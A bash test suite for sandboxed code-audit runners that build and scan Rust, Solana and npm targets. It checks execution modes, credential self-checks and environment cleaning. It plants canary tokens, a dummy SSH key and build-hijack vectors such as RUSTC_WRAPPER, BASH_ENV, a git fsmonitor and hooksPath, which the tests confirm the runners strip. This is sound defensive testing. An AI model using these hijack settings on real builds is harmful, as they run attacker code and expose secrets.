#!/usr/bin/env bash
# test-runners.sh — self-test for scripts/runner/target.sh, deps.sh and sast.sh: each case file under
# fixtures/{target,deps,sast}/ under each bash on the machine (/bin/bash and the bash running this suite,
# when they differ), in default and in strict mode (AUDITOR_STRICT=1), then each runner against stand-in
# toolchains (fixtures/runners/fake-tool.sh as cargo, cargo-build-sbf, cargo-audit, cargo-outdated, anchor,
# npm, node, semgrep, curl and rustup) that record their arguments, working directory, HOME, ulimit -t and -f
# and environment: the fixed command lines, the scratch copy outside the working directory, the mode rule with
# none and strict mode, the isolated self-check, the proxy and HOME split, canary variables, the watchdog and
# the caps, patches, revisions, submodules, artifacts, disclosure rows and large inputs, and for each check
# strict mode makes a refusal or a stop, the note default mode prints instead. A case where strict mode
# builds, which is isolated, runs only where isolated mode can (ISOLATED_OK). Then one case with the real tool
# for each action whose tool is installed: cargo test and cargo clippy, cargo build-sbf (when its platform
# tools are installed, so that nothing is downloaded), npm ci, cargo audit --no-fetch and cargo tree, all
# offline. With REQUIRE_TOOLCHAIN=1 (CI sets it), a missing cargo or rustup fails the run instead of skipping
# those. Needs git and python3; no network. Usage (from the repo root): bash scripts/tests/test-runners.sh
set -uo pipefail
ROOT=$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd -P)
TARGET=$ROOT/scripts/runner/target.sh
DEPS=$ROOT/scripts/runner/deps.sh
SAST=$ROOT/scripts/runner/sast.sh
FIXT=$ROOT/scripts/tests/fixtures
T=$(mktemp -d "${TMPDIR:-/tmp}/runners-test.XXXXXX") || exit 1
T=$(cd -P "$T" && pwd -P) || exit 1
trap 'chmod -R u+rwX "$T" 2>/dev/null; rm -rf "$T"' EXIT
REAL_HOME=${HOME:-}
REAL_PATH=$PATH
# The fixtures' own rundir.sh and git-ro.sh calls take the caller's environment: an AUDITOR_STRICT=1 there
# would leave strict markers that turn every default-mode case strict. The runners themselves get only what
# run passes (env -i).
unset AUDITOR_STRICT
export GIT_CONFIG_NOSYSTEM=1 GIT_TERMINAL_PROMPT=0
export GIT_AUTHOR_NAME=fixture GIT_AUTHOR_EMAIL=fixture@example.invalid
export GIT_COMMITTER_NAME=fixture GIT_COMMITTER_EMAIL=fixture@example.invalid

pass=0 fail=0 skip=0
ok()  { pass=$((pass + 1)); echo "ok   - $1"; }
ko()  { fail=$((fail + 1)); echo "FAIL - $1"; }
skp() { skip=$((skip + 1)); echo "skip - $1"; }
show() { echo "#   status ${RC:-} stdout [$(head -c 3000 "$T/out" 2>/dev/null)] stderr [$(head -c 3000 "$T/err" 2>/dev/null)]"; }
check() { # check <name> <command>...: on a failure, also show the last run
  if "${@:2}"; then ok "$1"; else ko "$1"; show; fi
}

SHELLS=("$BASH")
if [ -x /bin/bash ] && [ "$(/bin/bash -c 'printf %s "$BASH_VERSION"')" != "$BASH_VERSION" ]; then
  SHELLS+=(/bin/bash)
fi
echo "# shells: ${SHELLS[*]}"

# The tools a runner needs from the system, as links in $T/sys, and the stand-ins in $T/fake. FPATH puts the
# stand-ins first; SPATH has no toolchain at all.
mkdir -p "$T/sys" "$T/fake" "$T/fix" "$T/home-clean" "$T/marks"
for p in env git find grep sed sort tr head tail cat wc mkdir mktemp rm rmdir chmod cp ln mv date sleep kill dd \
  ls touch dirname basename id uname od cmp python3 sh bash mkfifo; do
  w=$(command -v "$p" 2>/dev/null) || continue
  case "$w" in /*) ln -s "$w" "$T/sys/$p" ;; esac
done
for n in cargo cargo-build-sbf cargo-audit cargo-outdated anchor npm node semgrep curl rustup; do
  sed "s#@T@#$T#g" "$FIXT/runners/fake-tool.sh" > "$T/fake/$n" && chmod 700 "$T/fake/$n"
done
FPATH=$T/fake:$T/sys
SPATH=$T/sys
NT=$T/tmp-new
CLEANHOME=$T/home-clean

settings() { # settings [NAME=value...]: what the stand-ins read, since the runners hand them a cleaned environment
  local kv
  : > "$T/fake/settings"
  for kv in "$@"; do printf "export %s='%s'\n" "${kv%%=*}" "${kv#*=}" >> "$T/fake/settings"; done
}
# run <prog> <dir> [NAME=value...] -- <argument>...: <prog> under the first shell from <dir>, with env -i and
# only HOME, PATH, TMPDIR and the NAME=value words (a later word wins); TMPDIR and $T/calls start empty.
# Output in $T/out and $T/err, status in RC, and S is the run's scratch directory, from the calls it made.
run() {
  local prog=$1 dir=$2
  shift 2
  local -a vars=()
  while [ $# -gt 0 ] && [ "$1" != -- ]; do vars+=("$1"); shift; done
  [ $# -gt 0 ] && shift
  rm -rf "$NT" "$T/calls"
  mkdir -p "$NT"
  : > "$T/calls"
  ( cd "$dir" && env -i HOME="$CLEANHOME" PATH="$FPATH" TMPDIR="$NT" ${vars[@]+"${vars[@]}"} "${SHELLS[0]}" "$prog" "$@" ) \
    >"$T/out" 2>"$T/err" </dev/null
  RC=$?
  S=$(sed -n "s#^cwd: \($NT/auditor-[a-z]*[.][A-Za-z0-9]\{6\}\).*#\1#p" "$T/calls" | sed -n 1p)
  [ -n "$S" ] || S=/nonexistent
}
headers()    { sed -n 's/^== //p' "$T/calls"; }
# in_blocks <header ERE> <line ERE>: every call block whose header matches (one at least) holds a matching
# line. none_in_blocks: such blocks exist, and none holds one. Patterns are awk EREs.
in_blocks() {
  awk -v h="$1" -v w="$2" '/^== / { if (on && !f) bad = 1; on = ($0 ~ h); f = 0; n += on; next }
    on && $0 ~ w { f = 1 } END { if (on && !f) bad = 1; exit (bad || n == 0) }' "$T/calls"
}
none_in_blocks() {
  awk -v h="$1" -v w="$2" '/^== / { on = ($0 ~ h); n += on; next } on && $0 ~ w { bad = 1 } END { exit (bad || n == 0) }' "$T/calls"
}
calls_are() { [ "$(headers | tr '\n' '|')" = "$1" ]; }
has_call() { headers > "$T/hdrs"; grep -qxF "$1" "$T/hdrs"; }
tree_of() { (cd "$1" && find . -print | LC_ALL=C sort); }
tgit() { git -c core.fsmonitor=false -c core.hooksPath=/dev/null "$@"; }

# ---- the fixture working directory --------------------------------------------------------------------
# $T/wt is a repository with a cargo workspace (programs/demo), Anchor.toml, a package lock, the target's own
# .cargo/config.toml and rust-toolchain.toml, app/ (an Anchor workspace with a yarn.lock), and two commits
# (programs/demo/src/lib.rs "// v1", then "// v2"). Its .git/config names programs and hooks that leave marks in $T/marks if they ever run. It holds
# audit_1 (exec-mode native, with patches F-1 that applies, F-3 that does not, F-2 of 16 MiB and one byte,
# and the copy src.git), incident_1 (no exec-mode), a.rs, src/, and linkdir, a link to audit_1.
WT=$T/wt
mkdir -p "$WT/programs/demo/src" "$WT/src" "$WT/.cargo"
tgit init -q "$WT" && tgit -C "$WT" symbolic-ref HEAD refs/heads/main
printf '[workspace]\nmembers = ["programs/demo"]\nresolver = "2"\n' > "$WT/Cargo.toml"
printf '[package]\nname = "demo"\nversion = "0.1.0"\nedition = "2021"\n' > "$WT/programs/demo/Cargo.toml"
printf '// v1\n' > "$WT/programs/demo/src/lib.rs"
printf '[provider]\ncluster = "mainnet"\nwallet = "~/.config/solana/id.json"\n' > "$WT/Anchor.toml"
printf '{\n  "name": "demo",\n  "version": "1.0.0"\n}\n' > "$WT/package.json"
printf '{\n  "name": "demo",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "packages": {}\n}\n' > "$WT/package-lock.json"
printf '[build]\nrustc-wrapper = "/nonexistent/wrapper"\n' > "$WT/.cargo/config.toml"
printf '[toolchain]\npath = "/nonexistent/toolchain"\n' > "$WT/rust-toolchain.toml"
printf 'fn a() {}\n' > "$WT/a.rs"
printf 'fn lib() {}\n' > "$WT/src/lib.rs"
mkdir -p "$WT/app"
printf '[provider]\ncluster = "localnet"\n' > "$WT/app/Anchor.toml"
printf '[package]\nname = "app"\nversion = "0.1.0"\n' > "$WT/app/Cargo.toml"
printf '# yarn lockfile v1\n' > "$WT/app/yarn.lock"
tgit -C "$WT" add -A && tgit -C "$WT" commit -qm v1
V1=$(tgit -C "$WT" rev-parse HEAD)
printf '// v2\n' > "$WT/programs/demo/src/lib.rs"
tgit -C "$WT" commit -qam v2
V2=$(tgit -C "$WT" rev-parse HEAD)
for m in fsmonitor hook; do
  printf '#!/bin/sh\ntouch "%s/marks/%s"\nexit 0\n' "$T" "$m" > "$T/mark-$m"
  chmod +x "$T/mark-$m"
done
mkdir -p "$T/hooks"
for h in post-checkout post-index-change reference-transaction pre-auto-gc; do cp "$T/mark-hook" "$T/hooks/$h"; done
printf '[core]\n\tfsmonitor = %s/mark-fsmonitor\n\thooksPath = %s/hooks\n' "$T" "$T" >> "$WT/.git/config"
( cd "$WT" && "$ROOT/scripts/rundir.sh" new audit && "$ROOT/scripts/rundir.sh" new incident ) >/dev/null ||
  ko "rundir.sh could not make the fixture's run directories"
printf 'native\n' > "$WT/audit_1/exec-mode"
printf -- '--- a/programs/demo/src/lib.rs\n+++ b/programs/demo/src/lib.rs\n@@ -1 +1 @@\n-// v2\n+// patched\n' > "$WT/audit_1/patches/F-1.patch"
printf -- '--- a/programs/demo/src/lib.rs\n+++ b/programs/demo/src/lib.rs\n@@ -1 +1 @@\n-// v9\n+// patched\n' > "$WT/audit_1/patches/F-3.patch"
dd if=/dev/zero of="$WT/audit_1/patches/F-2.patch" bs=1 count=0 seek=16777217 2>/dev/null
( cd "$WT" && "$ROOT/scripts/git-ro.sh" copy . audit_1 ) >/dev/null 2>&1 || ko "git-ro.sh copy could not make audit_1/src.git"
ln -s audit_1 "$WT/linkdir"
# For deps.sh, untracked beside them: Cargo.lock, sub/Cargo.lock, .cargo/Cargo.lock, big/Cargo.lock (50 MB and one
# byte), the target's .npmrc and .yarnrc.yml (each holding a canary token), sub/package-lock.json and
# npm-shrinkwrap.json.
mkdir -p "$WT/sub" "$WT/big"
printf '# generated\nversion = 3\n\n[[package]]\nname = "demo"\nversion = "0.1.0"\n' > "$WT/Cargo.lock"
cp "$WT/Cargo.lock" "$WT/sub/Cargo.lock"
cp "$WT/Cargo.lock" "$WT/.cargo/Cargo.lock"
dd if=/dev/zero of="$WT/big/Cargo.lock" bs=1 count=0 seek=52428801 2>/dev/null
printf '//registry.npmjs.org/:_authToken=canary-npmrc-token\n' > "$WT/.npmrc"
printf 'npmAuthToken: canary-yarnrc-token\n' > "$WT/.yarnrc.yml"
cp "$WT/package-lock.json" "$WT/sub/package-lock.json"
cp "$WT/package-lock.json" "$WT/npm-shrinkwrap.json"

# =================================================================================================
# The entry points, and each case file under each shell.
# =================================================================================================
for prog in "$TARGET" "$DEPS" "$SAST"; do
  rel=${prog#"$ROOT"/}
  check "$rel starts with #!/bin/bash" test "$(sed -n 1p "$prog")" = '#!/bin/bash'
  check "$rel is executable" test -x "$prog"
  if mode=$(git -C "$ROOT" ls-files -s -- "$rel" 2>/dev/null) && [ -n "$mode" ]; then
    check "git records $rel as 100755" test "${mode%% *}" = 100755
  fi
done
# Each case is refused the same way in default and in strict mode (AUDITOR_STRICT=1): it never gets as far
# as the mode. test-preapproved-entrypoints.sh replays these files under AUDITOR_STRICT=1.
for pair in "target:$TARGET" "deps:$DEPS" "sast:$SAST" "target:$TARGET:1" "deps:$DEPS:1" "sast:$SAST:1"; do
  name=${pair%%:*}
  prog=${pair#*:}
  strict=""
  case "$prog" in *:1) strict=1; prog=${prog%:1} ;; esac
  before=$(tree_of "$WT")
  ncase=0
  while IFS= read -r line; do
    case "$line" in ''|'#'*) continue ;; esac
    want_rc=${line%%$'\t'*}
    rest=${line#*$'\t'}
    want_err=${rest%%$'\t'*}
    rest=${rest#*$'\t'}
    IFS=$'\t' read -r -a args <<< "$rest"
    ncase=$((ncase + 1))
    label="$name${strict:+ (strict)} ${args[*]}"
    label=${label//[[:cntrl:]]/?}
    [ "${#label}" -le 160 ] || label="${label:0:160}..."
    i=0
    for sh in "${SHELLS[@]}"; do
      rm -rf "$NT"
      mkdir -p "$NT"
      ( cd "$WT" && env -i HOME="$CLEANHOME" PATH="$FPATH" TMPDIR="$NT" ${strict:+AUDITOR_STRICT=1} "$sh" "$prog" "${args[@]}" ) \
        >"$T/case.out.$i" 2>"$T/case.err.$i" </dev/null
      echo $? > "$T/case.rc.$i"
      [ -z "$(ls -A "$NT")" ] || echo scratch >> "$T/case.out.$i"
      i=$((i + 1))
    done
    if [ "$(cat "$T/case.rc.0")" = "$want_rc" ] && [ "$(cat "$T/case.err.0")" = "$want_err" ] && [ ! -s "$T/case.out.0" ]; then
      ok "case: $label"
    else
      ko "case: $label -> status $(cat "$T/case.rc.0"), stderr [$(cat "$T/case.err.0")], stdout [$(cat "$T/case.out.0")]"
    fi
    if [ "$i" -gt 1 ] && { ! cmp -s "$T/case.rc.0" "$T/case.rc.1" || ! cmp -s "$T/case.err.0" "$T/case.err.1" || ! cmp -s "$T/case.out.0" "$T/case.out.1"; }; then
      ko "case: $label prints differently under ${SHELLS[0]} and ${SHELLS[1]}"
    fi
  done < "$FIXT/$name/cases.txt"
  check "the $name case file has cases ($ncase)${strict:+, in strict mode}" test "$ncase" -gt 20
  check "no $name case changed anything in the working directory${strict:+, in strict mode}" test "$(tree_of "$WT")" = "$before"
  check "no $name case ran a configured program or hook of the repository${strict:+, in strict mode}" test -z "$(ls -A "$T/marks")"
done
for pair in "target:$TARGET" "deps:$DEPS" "sast:$SAST"; do
  run "${pair#*:}" "$WT" --
  check "${pair%%:*}.sh with no arguments: usage, exit 64" sh -c "[ '$RC' = 64 ] && grep -q '^${pair%%:*}: refused: usage: ' '$T/err' && [ ! -s '$T/out' ]"
done

# =================================================================================================
# target.sh: the mode, the self-check, and the environment-borne settings.
# =================================================================================================
# A driver for isolation.sh's self-check, as the runners call it, says whether this machine can pass
# isolated mode at all (an empty HOME and the account's home directory from the passwd database). A CI
# runner must, so that the isolated cases run there.
cat > "$T/iso-driver.sh" <<'SH'
root=$1
. "$root/scripts/lib/confine.sh"
. "$root/scripts/lib/isolation.sh"
confine_init iso-driver "$root"
cd / && iso_credentials
rc=$?
[ "$rc" = 0 ] || printf '%s\n' "${ISO_KINDS:-$ISO_WHY}"
exit "$rc"
SH
readable=$( (cd "$WT" && env -i HOME="$CLEANHOME" PATH="$FPATH" bash "$T/iso-driver.sh" "$ROOT") 2>&1 ) && ISOLATED_OK=1 || ISOLATED_OK=0
if [ "$ISOLATED_OK" = 1 ]; then
  ok "this machine passes the isolation self-check, so the cases where isolated mode runs run"
elif [ "${CI:-}" = true ]; then
  ko "this CI runner does not pass the isolation self-check ($readable), so the cases where isolated mode runs cannot run"
else
  echo "note: this machine is not an isolated runner ($readable); the cases where isolated mode runs are skipped"
fi
settings
# The mode is the stricter of exec-mode, AUDITOR_EXEC_MODE and strict mode (AUDITOR_STRICT=1, as isolated), and
# native when none of them says anything, with a note that says so. An isolated run where this machine fails
# the self-check stops there, after the mode line.
ISO_STOP='^target: blocker: isolated mode, but these are readable here: '
NOMODE='>> note: no execution mode is recorded, so target.sh builds natively, on this machine (OUTPUT-RULES.md Rule 11a)'
while IFS='|' read -r file env strict want; do
  [ -n "$want" ] || continue
  if [ -n "$file" ]; then printf '%s\n' "$file" > "$WT/audit_1/exec-mode"; else rm -f "$WT/audit_1/exec-mode"; fi
  set --
  [ -z "$env" ] || set -- "AUDITOR_EXEC_MODE=$env"
  [ -z "$strict" ] || set -- "$@" AUDITOR_STRICT=1
  run "$TARGET" "$WT" "$@" -- cargo-test --run audit_1 --src .
  label="exec-mode '${file:-absent}', AUDITOR_EXEC_MODE '${env:-unset}'${strict:+, AUDITOR_STRICT=1}"
  says="strict mode: off"
  [ -z "$strict" ] || says="strict mode: on (AUDITOR_STRICT=1)"
  line=">> execution mode: $want (the stricter of audit_1/exec-mode: ${file:-absent}; AUDITOR_EXEC_MODE: ${env:-unset}; $says; native when none is recorded)"
  case "$want" in
    native)
      if [ -z "$file$env$strict" ]; then
        check "$label: runs in native mode, with a note that no mode is recorded" \
          sh -c "[ '$RC' = 0 ] && grep -qxF '$line' '$T/out' && grep -qxF '$NOMODE' '$T/out'"
      else
        check "$label: runs in native mode" sh -c "[ '$RC' = 0 ] && grep -qxF '$line' '$T/out' && ! grep -q '^>> note: no execution mode' '$T/out'"
      fi ;;
    isolated)
      if [ "$ISOLATED_OK" = 1 ]; then
        check "$label: runs in isolated mode" sh -c "[ '$RC' = 0 ] && grep -qxF '$line' '$T/out' && ! grep -q '^>> note: no execution mode' '$T/out'"
      else
        check "$label: isolated mode, which the self-check stops here, after the mode line" \
          sh -c "[ '$RC' = 3 ] && grep -qxF '$line' '$T/out' && ! grep -q '^>> note: no execution mode' '$T/out' && grep -q '$ISO_STOP' '$T/err' && [ ! -s '$T/calls' ]"
      fi ;;
    none)
      check "$label: none, exit 3 before anything is copied" sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: the recorded execution mode is none (audit_1/exec-mode: ${file:-absent}; AUDITOR_EXEC_MODE: ${env:-unset}; $says): no target code is built or run for this engagement (OUTPUT-RULES.md Rule 11a) — nothing was copied or built.' '$T/err' && [ ! -s '$T/out' ] && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]" ;;
  esac
done <<'CASES'
native|||native
isolated|||isolated
|native||native
|isolated||isolated
native|isolated||isolated
isolated|native||isolated
none|||none
|none||none
native|none||none
none|native||none
isolated|none||none
|||native
||1|isolated
native||1|isolated
|native|1|isolated
none||1|none
|none|1|none
CASES
# --mode must name the mode that holds; strict mode's isolated counts. An incident run with no recorded mode is
# native too, and stops at the INCIDENTS.json it lacks.
printf 'native\n' > "$WT/audit_1/exec-mode"
for strict in "" 1; do
  says="strict mode: off" mode=native
  [ -z "$strict" ] || { says="strict mode: on (AUDITOR_STRICT=1)"; mode=isolated; }
  for arg in isolated none native; do
    [ "$arg" != "$mode" ] || continue
    run "$TARGET" "$WT" ${strict:+AUDITOR_STRICT=1} -- build-sbf --run audit_1 --src . --mode "$arg"
    check "--mode $arg where the mode is $mode${strict:+ (strict)}: exit 3 before anything is copied, naming the sources" \
      sh -c "[ '$RC' = 3 ] && [ \"\$(cat '$T/err')\" = 'target: blocker: --mode is $arg, but the recorded execution mode is $mode (audit_1/exec-mode: native; AUDITOR_EXEC_MODE: unset; $says); the mode changes only when the human answers again — nothing was copied or built.' ] && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
  done
  out=">> execution mode: $mode (the stricter of incident_1/exec-mode: absent; AUDITOR_EXEC_MODE: unset; $says; native when none is recorded)"
  what=$mode
  [ -n "$strict" ] || { out="$out
$NOMODE"; what="$mode, with the note"; }
  run "$TARGET" "$WT" ${strict:+AUDITOR_STRICT=1} -- cargo-test --run incident_1 --src .
  check "an incident run with no recorded mode${strict:+ (strict)}: $what, then exit 3 at the INCIDENTS.json it lacks, nothing copied" \
    sh -c "[ '$RC' = 3 ] && [ \"\$(cat '$T/out')\" = '$out' ] && grep -qxF \"target: blocker: incident_1/INCIDENTS.json is missing: an incident's code is built only once incident_1/INCIDENTS.json records its root_cause_class (OUTPUT-RULES.md Rule 11a, references/detection-response/incidents-schema.md) — nothing was copied or built.\" '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
done
# A strict marker in a run directory of the working directory turns strict mode on, as AUDITOR_STRICT=1 does.
printf 'strict\n' > "$WT/audit_1/strict"
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
check "a strict marker in audit_1: isolated, the marker named as the source" \
  grep -qxF '>> execution mode: isolated (the stricter of audit_1/exec-mode: native; AUDITOR_EXEC_MODE: unset; strict mode: on (audit_1/strict); native when none is recorded)' "$T/out"
rm -f "$WT/audit_1/strict"
# An AUDITOR_STRICT value that is neither on nor off is read as on, with a note from confine.sh: each runner
# prints it on stdout, as its own notes, so that stderr holds at most the blocker or refusal line. In a working
# directory of their own, so that what they keep numbers nothing the cases below count.
MW=$T/maybewt
mkdir -p "$MW/src"
tgit init -q "$MW" && tgit -C "$MW" symbolic-ref HEAD refs/heads/main
printf '[package]\nname = "maybe"\nversion = "0.1.0"\nedition = "2021"\n' > "$MW/Cargo.toml"
printf '# generated\nversion = 3\n\n[[package]]\nname = "maybe"\nversion = "0.1.0"\n' > "$MW/Cargo.lock"
printf 'pub fn m() {}\n' > "$MW/src/lib.rs"
tgit -C "$MW" add -A && tgit -C "$MW" commit -qm maybe
( cd "$MW" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$MW/audit_1/exec-mode"
MAYBE=">> note: AUDITOR_STRICT is 'maybe', read as on"
run "$TARGET" "$MW" AUDITOR_STRICT=maybe -- cargo-test --run audit_1 --src .
check "AUDITOR_STRICT=maybe: target.sh prints confine.sh's note on stdout, none on stderr, and the mode is isolated" \
  sh -c "grep -qxF \"$MAYBE\" '$T/out' && ! grep -q 'note:' '$T/err' && [ \"\$(grep -c . '$T/err')\" -le 1 ] && grep -q '^>> execution mode: isolated .*strict mode: on (AUDITOR_STRICT=maybe)' '$T/out'"
run "$DEPS" "$MW" AUDITOR_STRICT=maybe -- cargo-audit --run audit_1 --manifest Cargo.lock --no-fetch
check "... deps.sh too" sh -c "grep -qxF \"$MAYBE\" '$T/out' && ! grep -q 'note:' '$T/err' && [ \"\$(grep -c . '$T/err')\" -le 1 ]"
run "$SAST" "$MW" AUDITOR_STRICT=maybe -- semgrep --run audit_1 --path src --ruleset p/rust
check "... and sast.sh, before its last line" \
  sh -c "grep -qxF \"$MAYBE\" '$T/out' && [ \"\$(sed -n '\$p' '$T/out')\" != \"$MAYBE\" ] && ! grep -q 'note:' '$T/err' && [ \"\$(grep -c . '$T/err')\" -le 1 ]"
for bad in 'native extra' Native 'native native' ''; do
  printf '%s\n' "$bad" > "$WT/audit_1/exec-mode"
  run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
  check "an exec-mode holding '$bad' is refused" sh -c "[ '$RC' = 64 ] && grep -qxF 'target: refused: audit_1/exec-mode holds something other than one word, none, isolated or native' '$T/err' && [ ! -s '$T/calls' ]"
done
printf 'native\r\n' > "$WT/audit_1/exec-mode"
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
check "an exec-mode with a CRLF ending is refused" test "$RC" = 64
rm -f "$WT/audit_1/exec-mode"
mkdir "$WT/audit_1/exec-mode"
run "$TARGET" "$WT" -- cargo-test --run audit_1 --src .
check "an exec-mode that is a directory is refused" sh -c "[ '$RC' = 64 ] && grep -qxF 'target: refused: audit_1/exec-mode is not a regular file' '$T/err'"
rmdir "$WT/audit_1/exec-mode"
printf 'native\n' > "$WT/audit_1/exec-mode"
for kv in AUDITOR_EXEC_MODE=fast AUDITOR_RUN_TIMEOUT=0 AUDITOR_RUN_TIMEOUT=86401 AUDITOR_RUN_TIMEOUT=1e3 TOOLS_VERSION=1.54 TOOLS_VERSION='v1.54;x'; do
  run "$TARGET" "$WT" "$kv" -- cargo-test --run audit_1 --src .
  check "$kv is refused before anything runs" sh -c "[ '$RC' = 64 ] && grep -q '^target: refused: ${kv%%=*} is ' '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
done
run "$TARGET" "$WT" AUDITOR_RUN_TIMEOUT=60 -- cargo-test --run audit_1 --src . --timeout 61
check "--timeout above AUDITOR_RUN_TIMEOUT is refused and names it" sh -c "[ '$RC' = 64 ] && grep -qxF 'target: refused: --timeout is 61 seconds, more than AUDITOR_RUN_TIMEOUT (60); the user raises AUDITOR_RUN_TIMEOUT where Claude Code runs' '$T/err'"

# The self-check: in isolated mode a readable credential stops the run before anything is copied; in
# native mode it is a warning by kind and count, never a path.
CREDHOME=$T/home-creds
mkdir -p "$CREDHOME/.ssh"
printf 'key\n' > "$CREDHOME/.ssh/id_rsa"
run "$TARGET" "$WT" HOME="$CREDHOME" AUDITOR_EXEC_MODE=isolated -- cargo-test --run audit_1 --src .
check "isolated mode with a readable SSH key: exit 3, nothing copied, the kinds named and no path" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: isolated mode, but these are readable here: SSH keys (1)' '$T/err' && grep -q 'this is not the isolated runner (Rule 11a)' '$T/err' && ! grep -q 'id_rsa' '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
# That blocker says what the human changes to build natively instead: what recorded isolated (Addendum L). In
# strict mode isolated is the only way, and the blocker says so.
LISTS=', and scripts/runner/probe.sh --only isolation lists them'
NATIVE='. To build natively instead, on this machine, the human'
check "... and says how to build natively instead: the human unsets AUDITOR_EXEC_MODE" \
  sh -c "[ \"\$(grep -c . '$T/err')\" = 1 ] && grep -qF '$LISTS$NATIVE unsets AUDITOR_EXEC_MODE where Claude Code runs — nothing was copied or built.' '$T/err' && grep -q 'built\.\$' '$T/err'"
printf 'isolated\n' > "$WT/audit_1/exec-mode"
run "$TARGET" "$WT" HOME="$CREDHOME" -- cargo-test --run audit_1 --src .
check "... an exec-mode of isolated: the human writes native to it" \
  sh -c "[ '$RC' = 3 ] && grep -qF '$LISTS$NATIVE writes native to audit_1/exec-mode — nothing was copied or built.' '$T/err' && grep -q 'built\.\$' '$T/err'"
run "$TARGET" "$WT" HOME="$CREDHOME" AUDITOR_EXEC_MODE=isolated -- cargo-test --run audit_1 --src .
check "... both: both" \
  sh -c "[ '$RC' = 3 ] && grep -qF '$LISTS$NATIVE unsets AUDITOR_EXEC_MODE where Claude Code runs and writes native to audit_1/exec-mode — nothing was copied or built.' '$T/err' && grep -q 'built\.\$' '$T/err'"
printf 'native\n' > "$WT/audit_1/exec-mode"
run "$TARGET" "$WT" HOME="$CREDHOME" AUDITOR_STRICT=1 -- cargo-test --run audit_1 --src .
check "strict mode with a readable SSH key: exit 3, nothing copied, and the blocker says strict mode builds only on an isolated runner" \
  sh -c "[ '$RC' = 3 ] && grep -q '^target: blocker: isolated mode, but these are readable here: SSH keys (1)' '$T/err' && grep -qF '$LISTS. Strict mode is on (AUDITOR_STRICT=1), so target.sh builds only on an isolated runner (Rule 11f) — nothing was copied or built.' '$T/err' && ! grep -q 'To build natively' '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
run "$TARGET" "$WT" HOME="$CREDHOME" -- cargo-test --run audit_1 --src .
check "native mode with a readable SSH key: a warning by kind and count, and the run goes on" \
  sh -c "[ '$RC' = 0 ] && grep -q '^>> warning: native mode, and these are readable here, to the code this run builds and runs too: SSH keys (1)' '$T/out' && ! grep -q 'id_rsa' '$T/out'"
mkdir -p "$T/sys-nopy"
for f in "$T/sys/"*; do [ "${f##*/}" = python3 ] || ln -s "$(readlink "$f")" "$T/sys-nopy/${f##*/}"; done
run "$TARGET" "$WT" PATH="$T/fake:$T/sys-nopy" AUDITOR_EXEC_MODE=isolated -- cargo-test --run audit_1 --src .
check "isolated mode where the self-check cannot run (no python3): exit 3, nothing copied, and how to build natively instead" \
  sh -c "[ '$RC' = 3 ] && grep -qF 'target: blocker: isolated mode, but the credential self-check could not finish (python3 is not on PATH)' '$T/err' && grep -qF 'isolated runner (Rule 11a)$NATIVE unsets AUDITOR_EXEC_MODE where Claude Code runs — nothing was copied or built.' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"
run "$TARGET" "$WT" PATH="$T/fake:$T/sys-nopy" -- cargo-test --run audit_1 --src .
check "native mode without python3: a blocker before anything is copied, since only python3 tells that incident_1 holds no INCIDENTS.json" \
  sh -c "[ '$RC' = 3 ] && grep -qxF 'target: blocker: python3 is not on PATH, so target.sh cannot tell whether incident_1 holds an INCIDENTS.json, or read the root_cause_class one records (OUTPUT-RULES.md Rule 11a) — nothing was copied or built.' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"
if [ "$ISOLATED_OK" = 1 ]; then
  run "$TARGET" "$WT" AUDITOR_EXEC_MODE=isolated GITHUB_TOKEN=x -- cargo-test --run audit_1 --src .
  check "isolated mode names target.sh's own variables that look like credentials, and goes on" \
    sh -c "[ '$RC' = 0 ] && grep -q '^>> warning: isolated mode, and these variables of target.sh.s own environment look like credentials: GITHUB_TOKEN' '$T/out'"
fi

# =================================================================================================
# target.sh build-sbf: the fixed command lines, the scratch copy, HOME, the proxy and the canaries.
# =================================================================================================
PROXY=http://user:CANARY-proxy@127.0.0.1:9
CANARIES=(GITHUB_TOKEN=canary-gh NPM_TOKEN=canary-npm CARGO_REGISTRY_TOKEN=canary-cargo AWS_SECRET_ACCESS_KEY=canary-aws
  RPC_URL=https://canary-rpc.invalid SSH_AUTH_SOCK=/nonexistent/canary-agent AUDITOR_CANARY=canary-own
  RUSTC_WRAPPER=/canary-wrapper CARGO_BUILD_RUSTC_WRAPPER=/canary-wrapper2 RUSTFLAGS=canary-flags NODE_OPTIONS=canary-node
  PYTHONPATH=/canary-pythonpath BASH_ENV=/canary-bashenv "GIT_CONFIG_PARAMETERS='core.fsmonitor=/canary-git'"
  CARGO_TARGET_DIR=/canary-target GIT_DIR=/canary-gitdir
  npm_config_registry=https://canary-registry.invalid/ SOLANA_KEYPAIR=canary-keypair)
settings FAKE_SHOW=programs/demo/src/lib.rs
run "$TARGET" "$WT" "${CANARIES[@]}" HTTPS_PROXY="$PROXY" -- build-sbf --run audit_1 --src .
check "build-sbf: exit 0, the .so kept, and the last line says where" \
  sh -c "[ '$RC' = 0 ] && [ \"\$(sed -n '\$p' '$T/out')\" = '>> build-sbf: ok (exit 0); log audit_1/exec/build-sbf-1.log; 1 .so in audit_1/exec/build-sbf-1/: demo.so' ]"
check "build-sbf: the fixed command lines, in order" calls_are \
  "rustup default|cargo fetch --manifest-path $S/src/Cargo.toml|cargo build-sbf --help|cargo build-sbf --install-only|cargo build-sbf --skip-tools-install --offline --sbf-out-dir $S/out|"
check "every step runs in the scratch directory, outside the working directory" \
  sh -c "grep -q '^cwd: ' '$T/calls' && ! grep '^cwd: ' '$T/calls' | grep -v '^cwd: $S' | grep -q ."
